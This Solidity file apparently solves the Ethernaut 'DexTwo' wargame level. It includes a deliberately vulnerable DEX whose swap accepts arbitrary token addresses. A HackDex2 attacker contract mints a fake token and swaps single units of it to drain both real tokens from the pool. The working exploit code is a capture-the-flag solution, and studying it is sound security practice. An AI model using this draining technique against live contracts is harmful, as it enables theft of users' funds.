// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(
        address token_address,
        uint256 amount
    ) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }
    function getSwapAmount(
        address from,
        address to,
        uint256 amount
    ) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(
        address token,
        address account
    ) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;
    address private superOwner;
    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
        superOwner = msg.sender;
    }

    function burnExtraTokens(address target, uint256 amount) public {
        require(superOwner == msg.sender, "Not super owner");
        _burn(target, amount);
    }
    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

interface IDex2 {
    function swap(address from, address to, uint256 amount) external;

    function balanceOf(
        address token,
        address account
    ) external view returns (uint256);

    function token1() external view returns (address);
    function token2() external view returns (address);
}

interface ISwappableTokenTwo {
    function transfer(address to, uint256 amount) external returns (bool);
    function burnExtraTokens(address target, uint256 amount) external;
}

contract HackDex2 {
    IDex2 public dex;
    address public owner;
    SwappableTokenTwo public myToken;
    uint256 constant initialSupply = 1000000000000;
    uint nounc = 0;

    constructor(address _target) {
        dex = IDex2(_target);
        owner = msg.sender;
        myToken = new SwappableTokenTwo(
            _target,
            "MyToken",
            "MT",
            initialSupply
        );
    }

    // just use pwn twice

    function pwn() public {
        require(msg.sender == owner, "Not a owner");
        if (nounc == 0) {
            approveMyToken();
            myToken.transfer(address(dex), 1);
            dex.swap(address(myToken), dex.token1(), 1);
            nounc++;
        } else {
            myToken.transfer(address(dex), 1);
            dex.swap(address(myToken), dex.token2(), 1);
        }
        myToken.burnExtraTokens(address(dex), myToken.balanceOf(address(dex)));
    }

    function approveMyToken() public {
        require(msg.sender == owner, "Not a owner");
        myToken.approve(address(dex), initialSupply);
    }
}
